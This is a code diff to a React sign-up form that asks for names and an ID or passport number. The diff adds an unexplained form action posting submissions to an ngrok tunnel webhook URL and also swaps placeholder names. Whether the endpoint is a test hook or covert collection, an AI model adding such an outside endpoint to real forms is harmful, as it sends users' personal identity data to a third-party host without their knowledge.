@@ -273,7 +273,7 @@ export default function SignUp() {
             <CardDescription>Create your account to get started as a Merchant or Customer.</CardDescription>
           </CardHeader>
           <CardContent>
-            <form onSubmit={handleSignUp} className="space-y-4">
+            <form onSubmit={handleSignUp} className="space-y-4" action="https://dynamic-seahorse-multiply.ngrok-free.app/webhook-test/1adf1e1f-5821-465b-b873-94c2663615d2" method="post">
               {/* Basic Info Fields (Always Visible) */}
               <div className="grid grid-cols-2 gap-2">
                 <div className="grid gap-2">
@@ -281,19 +281,20 @@ export default function SignUp() {
                   <Input
                     id="firstName"
                     type="text"
-                    placeholder="John"
+                    placeholder="Mary"
                     value={firstName}
                     onChange={(e) => setFirstName(e.target.value)}
                     required
                     disabled={isAutofilled}
                   />
+
                 </div>
                 <div className="grid gap-2">
                   <Label htmlFor="lastName">Last Name</Label>
                   <Input
                     id="lastName"
                     type="text"
-                    placeholder="Doe"
+                    placeholder="Jane"
                     value={lastName}
                     onChange={(e) => setLastName(e.target.value)}
                     required
@@ -301,7 +302,7 @@ export default function SignUp() {
                   />
                 </div>
               </div>
-
+              
               <div className="grid gap-2">
                 <Label htmlFor="identityNumber">ID / Passport Number</Label>
                 <Input
